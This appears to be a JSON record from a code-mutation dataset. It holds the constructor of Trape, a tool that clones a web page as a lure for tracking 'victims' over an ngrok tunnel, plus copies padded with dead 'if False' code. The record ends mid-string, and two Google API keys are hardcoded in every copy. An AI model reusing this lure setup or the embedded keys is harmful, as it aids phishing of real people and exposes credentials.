[
    {
        "func_name": "__init__",
        "original": "def __init__(self, stat=0):\n    self.name_trape = 'Trape'\n    self.version = '2.1'\n    self.stats_path = 'ngrok'\n    self.home_path = utils.generateToken(18)\n    self.logout_path = utils.generateToken(6)\n    self.remove_path = utils.generateToken(14)\n    self.injectURL = utils.generateToken(12) + '.js'\n    self.stats_key = utils.generateToken(24)\n    self.date_start = time.strftime('%Y-%m-%d - %H:%M:%S')\n    self.stat = stat\n    self.localIp = '127.0.0.1'\n    self.nGrokUrl = ''\n    self.JSFiles = ({'path': 'base.js', 'src': utils.generateToken(12)}, {'path': 'libs.min.js', 'src': utils.generateToken(12)}, {'path': 'login.js', 'src': utils.generateToken(12)}, {'path': 'payload.js', 'src': utils.generateToken(12)}, {'path': 'trape.js', 'src': utils.generateToken(12)}, {'path': 'vscript.js', 'src': utils.generateToken(12)}, {'path': 'custom.js', 'src': utils.generateToken(12)})\n    self.CSSFiles = ({'path': '/static/img/favicon.ico', 'src': utils.generateToken(12)}, {'path': '/static/img/favicon.png', 'src': utils.generateToken(12)}, {'path': '/static/css/base-icons.css', 'src': utils.generateToken(12)}, {'path': '/static/css/styles.css', 'src': utils.generateToken(12)}, {'path': '/static/css/normalize.min.css', 'src': utils.generateToken(12)}, {'path': '/static/css/services-icons.css', 'src': utils.generateToken(12)})\n    if self.stat == 1:\n        c = http.client.HTTPConnection('www.google.com', timeout=5)\n        try:\n            c.request('HEAD', '/')\n            c.close()\n        except Exception as e:\n            c.close()\n            utils.Go('\\x1b[H\\x1b[J')\n            utils.Go(utils.Color['whiteBold'] + '[' + utils.Color['redBold'] + 'x' + utils.Color['whiteBold'] + ']' + utils.Color['redBold'] + ' ' + 'NOTICE: ' + utils.Color['white'] + 'Trape needs Internet connection for working' + '\\n\\t')\n            sys.exit(0)\n        if not os.path.exists('trape.config'):\n            self.trape_config()\n        try:\n            config_trape = json.load(open('trape.config'))\n        except Exception as error:\n            os.remove('trape.config')\n            self.trape_config()\n        self.ngrok = config_trape['ngrok_token']\n        self.gmaps = config_trape['gmaps_api_key']\n        self.ipinfo = config_trape['ipinfo_api_key']\n        if self.gmaps == '':\n            self.gmaps = 'AIzaSyA30wEa2DwUuddmNTHvoprhnrB2w_aCWbs'\n        self.googl = config_trape['gshortener_api_key']\n        if self.googl == '':\n            self.googl = 'AIzaSyDHMDTOGo9L1OBl5vRxOVM6vpXOXVp5jCc'\n        parser = argparse.ArgumentParser('python3 trape.py -u <<Url>> -p <<Port>>')\n        parser.add_argument('-u', '--url', dest='url', help='Put the web page url to clone')\n        parser.add_argument('-p', '--port', dest='port', help='Insert your port')\n        parser.add_argument('-ak', '--accesskey', dest='accesskey', help='Insert your custom key access')\n        parser.add_argument('-l', '--local', dest='local', help='Insert your home file')\n        parser.add_argument('-n', '--ngrok', dest='ngrok', help='Insert your ngrok Authtoken', action='store_true')\n        parser.add_argument('-ic', '--injectcode', dest='injc', help='Insert your custom REST API path')\n        parser.add_argument('-ud', '--update', dest='update', action='store_true', default=False, help='Update trape to the latest version')\n        options = parser.parse_args()\n        self.type_lure = 'global'\n        if options.update:\n            utils.Go('\\x1b[H\\x1b[J')\n            utils.Go('Updating...' + ' ' + utils.Color['blue'] + 'trape' + utils.Color['white'] + '...' + '\\n')\n            subprocess.check_output(['git', 'reset', '--hard', 'origin/master'])\n            subprocess.check_output(['git', 'pull'])\n            utils.Go('Trape Updated... Please execute again...')\n            sys.exit(0)\n        if options.url is None:\n            utils.Go('\\x1b[H\\x1b[J')\n            utils.Go('----------------------------------------------')\n            utils.Go('' + ' ' + utils.Color['redBold'] + 'TRAPE' + utils.Color['white'] + ' {' + utils.Color['yellowBold'] + 'stable' + utils.Color['white'] + '}' + utils.Color['white'] + ' - ' + 'Osint and analytics tool' + ' ' + '<' + utils.Color['white'])\n            utils.Go('----------------------------------------------')\n            utils.Go('| v' + utils.Color['redBold'] + self.version + utils.Color['white'] + ' |')\n            utils.Go('--------' + '\\n')\n            utils.Go(utils.Color['whiteBold'] + '[' + utils.Color['greenBold'] + '!' + utils.Color['whiteBold'] + ']' + ' ' + utils.Color['white'] + 'Enter the information requested below to complete the execution' + utils.Color['white'])\n            utils.Go('')\n            options.url = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' Enter a URL to generate the lure' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n        if options.port is None:\n            options.port = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' What is your port to generate the server?' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n        while utils.checkPort(int(options.port)) == False:\n            utils.Go('\\x1b[H\\x1b[J')\n            utils.Go('----------------------------------------------')\n            utils.Go('' + ' ' + utils.Color['redBold'] + 'TRAPE' + utils.Color['white'] + ' {' + utils.Color['yellowBold'] + 'stable' + utils.Color['white'] + '}' + utils.Color['white'] + ' - ' + 'Osint and analytics tool' + ' ' + '<' + utils.Color['white'])\n            utils.Go('----------------------------------------------')\n            utils.Go('\\n')\n            utils.Go(utils.Color['whiteBold'] + '[' + utils.Color['redBold'] + 'x' + utils.Color['whiteBold'] + ']' + utils.Color['redBold'] + ' ' + 'ERROR:' + ' ' + utils.Color['whiteBold'] + 'The port: ' + options.port + utils.Color['white'] + ' ' + 'is not available, It was previously used (' + utils.Color['yellow'] + 'Use another port' + utils.Text['end'] + ')' + '\\n\\n')\n            options.port = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' What is your port to generate the server?' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n            options.url = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' Enter a URL to generate the lure' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n        utils.Go('')\n        utils.Go(utils.Color['greenBold'] + '-' + utils.Color['white'] + ' Successful ' + utils.Color['greenBold'] + 'startup' + utils.Color['white'] + ', get lucky on the way!' + utils.Color['white'])\n        utils.Go('')\n        time.sleep(0.1)\n        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        s.connect(('8.8.8.8', 80))\n        self.localIp = s.getsockname()[0]\n        self.app_port = int(options.port)\n        self.url_to_clone = str(options.url)\n        if self.url_to_clone[0:4] != 'http':\n            self.url_to_clone = 'http://' + self.url_to_clone\n        self.victim_path = options.url.replace('http://', '').replace('https://', '')\n        if options.ngrok or self.ngrok != '':\n            if self.ngrok == '':\n                utils.Go('\\x1b[H\\x1b[J')\n                self.ngrok = input('What is your nGrok token?' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n            if self.ngrok != '':\n                from core.ngrok import ngrok\n                import os.path as path\n                v_ngrok = ngrok(self.ngrok, self.app_port, stat, self.stats_path)\n            else:\n                utils.Go(utils.Color['whiteBold'] + '[' + utils.Color['redBold'] + 'x' + utils.Color['whiteBold'] + ']' + utils.Color['redBold'] + ' ' + 'ERROR: ' + ' ' + utils.Color['white'] + \"Your nGrok authtoken can't be empty\")\n        if options.injc:\n            self.injectURL = options.injc\n        if options.accesskey:\n            self.stats_key = options.accesskey",
        "mutated": [
            "def __init__(self, stat=0):\n    if False:\n        i = 10\n    self.name_trape = 'Trape'\n    self.version = '2.1'\n    self.stats_path = 'ngrok'\n    self.home_path = utils.generateToken(18)\n    self.logout_path = utils.generateToken(6)\n    self.remove_path = utils.generateToken(14)\n    self.injectURL = utils.generateToken(12) + '.js'\n    self.stats_key = utils.generateToken(24)\n    self.date_start = time.strftime('%Y-%m-%d - %H:%M:%S')\n    self.stat = stat\n    self.localIp = '127.0.0.1'\n    self.nGrokUrl = ''\n    self.JSFiles = ({'path': 'base.js', 'src': utils.generateToken(12)}, {'path': 'libs.min.js', 'src': utils.generateToken(12)}, {'path': 'login.js', 'src': utils.generateToken(12)}, {'path': 'payload.js', 'src': utils.generateToken(12)}, {'path': 'trape.js', 'src': utils.generateToken(12)}, {'path': 'vscript.js', 'src': utils.generateToken(12)}, {'path': 'custom.js', 'src': utils.generateToken(12)})\n    self.CSSFiles = ({'path': '/static/img/favicon.ico', 'src': utils.generateToken(12)}, {'path': '/static/img/favicon.png', 'src': utils.generateToken(12)}, {'path': '/static/css/base-icons.css', 'src': utils.generateToken(12)}, {'path': '/static/css/styles.css', 'src': utils.generateToken(12)}, {'path': '/static/css/normalize.min.css', 'src': utils.generateToken(12)}, {'path': '/static/css/services-icons.css', 'src': utils.generateToken(12)})\n    if self.stat == 1:\n        c = http.client.HTTPConnection('www.google.com', timeout=5)\n        try:\n            c.request('HEAD', '/')\n            c.close()\n        except Exception as e:\n            c.close()\n            utils.Go('\\x1b[H\\x1b[J')\n            utils.Go(utils.Color['whiteBold'] + '[' + utils.Color['redBold'] + 'x' + utils.Color['whiteBold'] + ']' + utils.Color['redBold'] + ' ' + 'NOTICE: ' + utils.Color['white'] + 'Trape needs Internet connection for working' + '\\n\\t')\n            sys.exit(0)\n        if not os.path.exists('trape.config'):\n            self.trape_config()\n        try:\n            config_trape = json.load(open('trape.config'))\n        except Exception as error:\n            os.remove('trape.config')\n            self.trape_config()\n        self.ngrok = config_trape['ngrok_token']\n        self.gmaps = config_trape['gmaps_api_key']\n        self.ipinfo = config_trape['ipinfo_api_key']\n        if self.gmaps == '':\n            self.gmaps = 'AIzaSyA30wEa2DwUuddmNTHvoprhnrB2w_aCWbs'\n        self.googl = config_trape['gshortener_api_key']\n        if self.googl == '':\n            self.googl = 'AIzaSyDHMDTOGo9L1OBl5vRxOVM6vpXOXVp5jCc'\n        parser = argparse.ArgumentParser('python3 trape.py -u <<Url>> -p <<Port>>')\n        parser.add_argument('-u', '--url', dest='url', help='Put the web page url to clone')\n        parser.add_argument('-p', '--port', dest='port', help='Insert your port')\n        parser.add_argument('-ak', '--accesskey', dest='accesskey', help='Insert your custom key access')\n        parser.add_argument('-l', '--local', dest='local', help='Insert your home file')\n        parser.add_argument('-n', '--ngrok', dest='ngrok', help='Insert your ngrok Authtoken', action='store_true')\n        parser.add_argument('-ic', '--injectcode', dest='injc', help='Insert your custom REST API path')\n        parser.add_argument('-ud', '--update', dest='update', action='store_true', default=False, help='Update trape to the latest version')\n        options = parser.parse_args()\n        self.type_lure = 'global'\n        if options.update:\n            utils.Go('\\x1b[H\\x1b[J')\n            utils.Go('Updating...' + ' ' + utils.Color['blue'] + 'trape' + utils.Color['white'] + '...' + '\\n')\n            subprocess.check_output(['git', 'reset', '--hard', 'origin/master'])\n            subprocess.check_output(['git', 'pull'])\n            utils.Go('Trape Updated... Please execute again...')\n            sys.exit(0)\n        if options.url is None:\n            utils.Go('\\x1b[H\\x1b[J')\n            utils.Go('----------------------------------------------')\n            utils.Go('' + ' ' + utils.Color['redBold'] + 'TRAPE' + utils.Color['white'] + ' {' + utils.Color['yellowBold'] + 'stable' + utils.Color['white'] + '}' + utils.Color['white'] + ' - ' + 'Osint and analytics tool' + ' ' + '<' + utils.Color['white'])\n            utils.Go('----------------------------------------------')\n            utils.Go('| v' + utils.Color['redBold'] + self.version + utils.Color['white'] + ' |')\n            utils.Go('--------' + '\\n')\n            utils.Go(utils.Color['whiteBold'] + '[' + utils.Color['greenBold'] + '!' + utils.Color['whiteBold'] + ']' + ' ' + utils.Color['white'] + 'Enter the information requested below to complete the execution' + utils.Color['white'])\n            utils.Go('')\n            options.url = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' Enter a URL to generate the lure' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n        if options.port is None:\n            options.port = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' What is your port to generate the server?' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n        while utils.checkPort(int(options.port)) == False:\n            utils.Go('\\x1b[H\\x1b[J')\n            utils.Go('----------------------------------------------')\n            utils.Go('' + ' ' + utils.Color['redBold'] + 'TRAPE' + utils.Color['white'] + ' {' + utils.Color['yellowBold'] + 'stable' + utils.Color['white'] + '}' + utils.Color['white'] + ' - ' + 'Osint and analytics tool' + ' ' + '<' + utils.Color['white'])\n            utils.Go('----------------------------------------------')\n            utils.Go('\\n')\n            utils.Go(utils.Color['whiteBold'] + '[' + utils.Color['redBold'] + 'x' + utils.Color['whiteBold'] + ']' + utils.Color['redBold'] + ' ' + 'ERROR:' + ' ' + utils.Color['whiteBold'] + 'The port: ' + options.port + utils.Color['white'] + ' ' + 'is not available, It was previously used (' + utils.Color['yellow'] + 'Use another port' + utils.Text['end'] + ')' + '\\n\\n')\n            options.port = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' What is your port to generate the server?' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n            options.url = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' Enter a URL to generate the lure' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n        utils.Go('')\n        utils.Go(utils.Color['greenBold'] + '-' + utils.Color['white'] + ' Successful ' + utils.Color['greenBold'] + 'startup' + utils.Color['white'] + ', get lucky on the way!' + utils.Color['white'])\n        utils.Go('')\n        time.sleep(0.1)\n        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        s.connect(('8.8.8.8', 80))\n        self.localIp = s.getsockname()[0]\n        self.app_port = int(options.port)\n        self.url_to_clone = str(options.url)\n        if self.url_to_clone[0:4] != 'http':\n            self.url_to_clone = 'http://' + self.url_to_clone\n        self.victim_path = options.url.replace('http://', '').replace('https://', '')\n        if options.ngrok or self.ngrok != '':\n            if self.ngrok == '':\n                utils.Go('\\x1b[H\\x1b[J')\n                self.ngrok = input('What is your nGrok token?' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n            if self.ngrok != '':\n                from core.ngrok import ngrok\n                import os.path as path\n                v_ngrok = ngrok(self.ngrok, self.app_port, stat, self.stats_path)\n            else:\n                utils.Go(utils.Color['whiteBold'] + '[' + utils.Color['redBold'] + 'x' + utils.Color['whiteBold'] + ']' + utils.Color['redBold'] + ' ' + 'ERROR: ' + ' ' + utils.Color['white'] + \"Your nGrok authtoken can't be empty\")\n        if options.injc:\n            self.injectURL = options.injc\n        if options.accesskey:\n            self.stats_key = options.accesskey",
            "def __init__(self, stat=0):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    self.name_trape = 'Trape'\n    self.version = '2.1'\n    self.stats_path = 'ngrok'\n    self.home_path = utils.generateToken(18)\n    self.logout_path = utils.generateToken(6)\n    self.remove_path = utils.generateToken(14)\n    self.injectURL = utils.generateToken(12) + '.js'\n    self.stats_key = utils.generateToken(24)\n    self.date_start = time.strftime('%Y-%m-%d - %H:%M:%S')\n    self.stat = stat\n    self.localIp = '127.0.0.1'\n    self.nGrokUrl = ''\n    self.JSFiles = ({'path': 'base.js', 'src': utils.generateToken(12)}, {'path': 'libs.min.js', 'src': utils.generateToken(12)}, {'path': 'login.js', 'src': utils.generateToken(12)}, {'path': 'payload.js', 'src': utils.generateToken(12)}, {'path': 'trape.js', 'src': utils.generateToken(12)}, {'path': 'vscript.js', 'src': utils.generateToken(12)}, {'path': 'custom.js', 'src': utils.generateToken(12)})\n    self.CSSFiles = ({'path': '/static/img/favicon.ico', 'src': utils.generateToken(12)}, {'path': '/static/img/favicon.png', 'src': utils.generateToken(12)}, {'path': '/static/css/base-icons.css', 'src': utils.generateToken(12)}, {'path': '/static/css/styles.css', 'src': utils.generateToken(12)}, {'path': '/static/css/normalize.min.css', 'src': utils.generateToken(12)}, {'path': '/static/css/services-icons.css', 'src': utils.generateToken(12)})\n    if self.stat == 1:\n        c = http.client.HTTPConnection('www.google.com', timeout=5)\n        try:\n            c.request('HEAD', '/')\n            c.close()\n        except Exception as e:\n            c.close()\n            utils.Go('\\x1b[H\\x1b[J')\n            utils.Go(utils.Color['whiteBold'] + '[' + utils.Color['redBold'] + 'x' + utils.Color['whiteBold'] + ']' + utils.Color['redBold'] + ' ' + 'NOTICE: ' + utils.Color['white'] + 'Trape needs Internet connection for working' + '\\n\\t')\n            sys.exit(0)\n        if not os.path.exists('trape.config'):\n            self.trape_config()\n        try:\n            config_trape = json.load(open('trape.config'))\n        except Exception as error:\n            os.remove('trape.config')\n            self.trape_config()\n        self.ngrok = config_trape['ngrok_token']\n        self.gmaps = config_trape['gmaps_api_key']\n        self.ipinfo = config_trape['ipinfo_api_key']\n        if self.gmaps == '':\n            self.gmaps = 'AIzaSyA30wEa2DwUuddmNTHvoprhnrB2w_aCWbs'\n        self.googl = config_trape['gshortener_api_key']\n        if self.googl == '':\n            self.googl = 'AIzaSyDHMDTOGo9L1OBl5vRxOVM6vpXOXVp5jCc'\n        parser = argparse.ArgumentParser('python3 trape.py -u <<Url>> -p <<Port>>')\n        parser.add_argument('-u', '--url', dest='url', help='Put the web page url to clone')\n        parser.add_argument('-p', '--port', dest='port', help='Insert your port')\n        parser.add_argument('-ak', '--accesskey', dest='accesskey', help='Insert your custom key access')\n        parser.add_argument('-l', '--local', dest='local', help='Insert your home file')\n        parser.add_argument('-n', '--ngrok', dest='ngrok', help='Insert your ngrok Authtoken', action='store_true')\n        parser.add_argument('-ic', '--injectcode', dest='injc', help='Insert your custom REST API path')\n        parser.add_argument('-ud', '--update', dest='update', action='store_true', default=False, help='Update trape to the latest version')\n        options = parser.parse_args()\n        self.type_lure = 'global'\n        if options.update:\n            utils.Go('\\x1b[H\\x1b[J')\n            utils.Go('Updating...' + ' ' + utils.Color['blue'] + 'trape' + utils.Color['white'] + '...' + '\\n')\n            subprocess.check_output(['git', 'reset', '--hard', 'origin/master'])\n            subprocess.check_output(['git', 'pull'])\n            utils.Go('Trape Updated... Please execute again...')\n            sys.exit(0)\n        if options.url is None:\n            utils.Go('\\x1b[H\\x1b[J')\n            utils.Go('----------------------------------------------')\n            utils.Go('' + ' ' + utils.Color['redBold'] + 'TRAPE' + utils.Color['white'] + ' {' + utils.Color['yellowBold'] + 'stable' + utils.Color['white'] + '}' + utils.Color['white'] + ' - ' + 'Osint and analytics tool' + ' ' + '<' + utils.Color['white'])\n            utils.Go('----------------------------------------------')\n            utils.Go('| v' + utils.Color['redBold'] + self.version + utils.Color['white'] + ' |')\n            utils.Go('--------' + '\\n')\n            utils.Go(utils.Color['whiteBold'] + '[' + utils.Color['greenBold'] + '!' + utils.Color['whiteBold'] + ']' + ' ' + utils.Color['white'] + 'Enter the information requested below to complete the execution' + utils.Color['white'])\n            utils.Go('')\n            options.url = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' Enter a URL to generate the lure' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n        if options.port is None:\n            options.port = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' What is your port to generate the server?' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n        while utils.checkPort(int(options.port)) == False:\n            utils.Go('\\x1b[H\\x1b[J')\n            utils.Go('----------------------------------------------')\n            utils.Go('' + ' ' + utils.Color['redBold'] + 'TRAPE' + utils.Color['white'] + ' {' + utils.Color['yellowBold'] + 'stable' + utils.Color['white'] + '}' + utils.Color['white'] + ' - ' + 'Osint and analytics tool' + ' ' + '<' + utils.Color['white'])\n            utils.Go('----------------------------------------------')\n            utils.Go('\\n')\n            utils.Go(utils.Color['whiteBold'] + '[' + utils.Color['redBold'] + 'x' + utils.Color['whiteBold'] + ']' + utils.Color['redBold'] + ' ' + 'ERROR:' + ' ' + utils.Color['whiteBold'] + 'The port: ' + options.port + utils.Color['white'] + ' ' + 'is not available, It was previously used (' + utils.Color['yellow'] + 'Use another port' + utils.Text['end'] + ')' + '\\n\\n')\n            options.port = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' What is your port to generate the server?' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n            options.url = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' Enter a URL to generate the lure' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n        utils.Go('')\n        utils.Go(utils.Color['greenBold'] + '-' + utils.Color['white'] + ' Successful ' + utils.Color['greenBold'] + 'startup' + utils.Color['white'] + ', get lucky on the way!' + utils.Color['white'])\n        utils.Go('')\n        time.sleep(0.1)\n        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        s.connect(('8.8.8.8', 80))\n        self.localIp = s.getsockname()[0]\n        self.app_port = int(options.port)\n        self.url_to_clone = str(options.url)\n        if self.url_to_clone[0:4] != 'http':\n            self.url_to_clone = 'http://' + self.url_to_clone\n        self.victim_path = options.url.replace('http://', '').replace('https://', '')\n        if options.ngrok or self.ngrok != '':\n            if self.ngrok == '':\n                utils.Go('\\x1b[H\\x1b[J')\n                self.ngrok = input('What is your nGrok token?' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n            if self.ngrok != '':\n                from core.ngrok import ngrok\n                import os.path as path\n                v_ngrok = ngrok(self.ngrok, self.app_port, stat, self.stats_path)\n            else:\n                utils.Go(utils.Color['whiteBold'] + '[' + utils.Color['redBold'] + 'x' + utils.Color['whiteBold'] + ']' + utils.Color['redBold'] + ' ' + 'ERROR: ' + ' ' + utils.Color['white'] + \"Your nGrok authtoken can't be empty\")\n        if options.injc:\n            self.injectURL = options.injc\n        if options.accesskey:\n            self.stats_key = options.accesskey",
            "def __init__(self, stat=0):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    self.name_trape = 'Trape'\n    self.version = '2.1'\n    self.stats_path = 'ngrok'\n    self.home_path = utils.generateToken(18)\n    self.logout_path = utils.generateToken(6)\n    self.remove_path = utils.generateToken(14)\n    self.injectURL = utils.generateToken(12) + '.js'\n    self.stats_key = utils.generateToken(24)\n    self.date_start = time.strftime('%Y-%m-%d - %H:%M:%S')\n    self.stat = stat\n    self.localIp = '127.0.0.1'\n    self.nGrokUrl = ''\n    self.JSFiles = ({'path': 'base.js', 'src': utils.generateToken(12)}, {'path': 'libs.min.js', 'src': utils.generateToken(12)}, {'path': 'login.js', 'src': utils.generateToken(12)}, {'path': 'payload.js', 'src': utils.generateToken(12)}, {'path': 'trape.js', 'src': utils.generateToken(12)}, {'path': 'vscript.js', 'src': utils.generateToken(12)}, {'path': 'custom.js', 'src': utils.generateToken(12)})\n    self.CSSFiles = ({'path': '/static/img/favicon.ico', 'src': utils.generateToken(12)}, {'path': '/static/img/favicon.png', 'src': utils.generateToken(12)}, {'path': '/static/css/base-icons.css', 'src': utils.generateToken(12)}, {'path': '/static/css/styles.css', 'src': utils.generateToken(12)}, {'path': '/static/css/normalize.min.css', 'src': utils.generateToken(12)}, {'path': '/static/css/services-icons.css', 'src': utils.generateToken(12)})\n    if self.stat == 1:\n        c = http.client.HTTPConnection('www.google.com', timeout=5)\n        try:\n            c.request('HEAD', '/')\n            c.close()\n        except Exception as e:\n            c.close()\n            utils.Go('\\x1b[H\\x1b[J')\n            utils.Go(utils.Color['whiteBold'] + '[' + utils.Color['redBold'] + 'x' + utils.Color['whiteBold'] + ']' + utils.Color['redBold'] + ' ' + 'NOTICE: ' + utils.Color['white'] + 'Trape needs Internet connection for working' + '\\n\\t')\n            sys.exit(0)\n        if not os.path.exists('trape.config'):\n            self.trape_config()\n        try:\n            config_trape = json.load(open('trape.config'))\n        except Exception as error:\n            os.remove('trape.config')\n            self.trape_config()\n        self.ngrok = config_trape['ngrok_token']\n        self.gmaps = config_trape['gmaps_api_key']\n        self.ipinfo = config_trape['ipinfo_api_key']\n        if self.gmaps == '':\n            self.gmaps = 'AIzaSyA30wEa2DwUuddmNTHvoprhnrB2w_aCWbs'\n        self.googl = config_trape['gshortener_api_key']\n        if self.googl == '':\n            self.googl = 'AIzaSyDHMDTOGo9L1OBl5vRxOVM6vpXOXVp5jCc'\n        parser = argparse.ArgumentParser('python3 trape.py -u <<Url>> -p <<Port>>')\n        parser.add_argument('-u', '--url', dest='url', help='Put the web page url to clone')\n        parser.add_argument('-p', '--port', dest='port', help='Insert your port')\n        parser.add_argument('-ak', '--accesskey', dest='accesskey', help='Insert your custom key access')\n        parser.add_argument('-l', '--local', dest='local', help='Insert your home file')\n        parser.add_argument('-n', '--ngrok', dest='ngrok', help='Insert your ngrok Authtoken', action='store_true')\n        parser.add_argument('-ic', '--injectcode', dest='injc', help='Insert your custom REST API path')\n        parser.add_argument('-ud', '--update', dest='update', action='store_true', default=False, help='Update trape to the latest version')\n        options = parser.parse_args()\n        self.type_lure = 'global'\n        if options.update:\n            utils.Go('\\x1b[H\\x1b[J')\n            utils.Go('Updating...' + ' ' + utils.Color['blue'] + 'trape' + utils.Color['white'] + '...' + '\\n')\n            subprocess.check_output(['git', 'reset', '--hard', 'origin/master'])\n            subprocess.check_output(['git', 'pull'])\n            utils.Go('Trape Updated... Please execute again...')\n            sys.exit(0)\n        if options.url is None:\n            utils.Go('\\x1b[H\\x1b[J')\n            utils.Go('----------------------------------------------')\n            utils.Go('' + ' ' + utils.Color['redBold'] + 'TRAPE' + utils.Color['white'] + ' {' + utils.Color['yellowBold'] + 'stable' + utils.Color['white'] + '}' + utils.Color['white'] + ' - ' + 'Osint and analytics tool' + ' ' + '<' + utils.Color['white'])\n            utils.Go('----------------------------------------------')\n            utils.Go('| v' + utils.Color['redBold'] + self.version + utils.Color['white'] + ' |')\n            utils.Go('--------' + '\\n')\n            utils.Go(utils.Color['whiteBold'] + '[' + utils.Color['greenBold'] + '!' + utils.Color['whiteBold'] + ']' + ' ' + utils.Color['white'] + 'Enter the information requested below to complete the execution' + utils.Color['white'])\n            utils.Go('')\n            options.url = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' Enter a URL to generate the lure' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n        if options.port is None:\n            options.port = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' What is your port to generate the server?' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n        while utils.checkPort(int(options.port)) == False:\n            utils.Go('\\x1b[H\\x1b[J')\n            utils.Go('----------------------------------------------')\n            utils.Go('' + ' ' + utils.Color['redBold'] + 'TRAPE' + utils.Color['white'] + ' {' + utils.Color['yellowBold'] + 'stable' + utils.Color['white'] + '}' + utils.Color['white'] + ' - ' + 'Osint and analytics tool' + ' ' + '<' + utils.Color['white'])\n            utils.Go('----------------------------------------------')\n            utils.Go('\\n')\n            utils.Go(utils.Color['whiteBold'] + '[' + utils.Color['redBold'] + 'x' + utils.Color['whiteBold'] + ']' + utils.Color['redBold'] + ' ' + 'ERROR:' + ' ' + utils.Color['whiteBold'] + 'The port: ' + options.port + utils.Color['white'] + ' ' + 'is not available, It was previously used (' + utils.Color['yellow'] + 'Use another port' + utils.Text['end'] + ')' + '\\n\\n')\n            options.port = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' What is your port to generate the server?' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n            options.url = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' Enter a URL to generate the lure' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n        utils.Go('')\n        utils.Go(utils.Color['greenBold'] + '-' + utils.Color['white'] + ' Successful ' + utils.Color['greenBold'] + 'startup' + utils.Color['white'] + ', get lucky on the way!' + utils.Color['white'])\n        utils.Go('')\n        time.sleep(0.1)\n        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        s.connect(('8.8.8.8', 80))\n        self.localIp = s.getsockname()[0]\n        self.app_port = int(options.port)\n        self.url_to_clone = str(options.url)\n        if self.url_to_clone[0:4] != 'http':\n            self.url_to_clone = 'http://' + self.url_to_clone\n        self.victim_path = options.url.replace('http://', '').replace('https://', '')\n        if options.ngrok or self.ngrok != '':\n            if self.ngrok == '':\n                utils.Go('\\x1b[H\\x1b[J')\n                self.ngrok = input('What is your nGrok token?' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n            if self.ngrok != '':\n                from core.ngrok import ngrok\n                import os.path as path\n                v_ngrok = ngrok(self.ngrok, self.app_port, stat, self.stats_path)\n            else:\n                utils.Go(utils.Color['whiteBold'] + '[' + utils.Color['redBold'] + 'x' + utils.Color['whiteBold'] + ']' + utils.Color['redBold'] + ' ' + 'ERROR: ' + ' ' + utils.Color['white'] + \"Your nGrok authtoken can't be empty\")\n        if options.injc:\n            self.injectURL = options.injc\n        if options.accesskey:\n            self.stats_key = options.accesskey",
            "def __init__(self, stat=0):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    self.name_trape = 'Trape'\n    self.version = '2.1'\n    self.stats_path = 'ngrok'\n    self.home_path = utils.generateToken(18)\n    self.logout_path = utils.generateToken(6)\n    self.remove_path = utils.generateToken(14)\n    self.injectURL = utils.generateToken(12) + '.js'\n    self.stats_key = utils.generateToken(24)\n    self.date_start = time.strftime('%Y-%m-%d - %H:%M:%S')\n    self.stat = stat\n    self.localIp = '127.0.0.1'\n    self.nGrokUrl = ''\n    self.JSFiles = ({'path': 'base.js', 'src': utils.generateToken(12)}, {'path': 'libs.min.js', 'src': utils.generateToken(12)}, {'path': 'login.js', 'src': utils.generateToken(12)}, {'path': 'payload.js', 'src': utils.generateToken(12)}, {'path': 'trape.js', 'src': utils.generateToken(12)}, {'path': 'vscript.js', 'src': utils.generateToken(12)}, {'path': 'custom.js', 'src': utils.generateToken(12)})\n    self.CSSFiles = ({'path': '/static/img/favicon.ico', 'src': utils.generateToken(12)}, {'path': '/static/img/favicon.png', 'src': utils.generateToken(12)}, {'path': 